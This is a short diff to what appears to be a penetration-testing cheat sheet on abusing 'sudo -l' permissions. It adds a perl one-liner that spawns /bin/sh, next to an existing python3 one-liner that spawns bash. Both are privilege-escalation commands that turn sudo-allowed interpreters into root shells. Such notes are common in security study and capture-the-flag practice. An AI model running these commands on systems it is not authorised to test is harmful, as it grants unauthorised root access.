@@ -1,4 +1,6 @@
 ## sudo -l
+#### perl
+`sudo perl -e 'exec "/bin/sh";'`
 #### python
 `sudo python3 -c 'import os; os.system("/bin/bash")'`
 #### awk
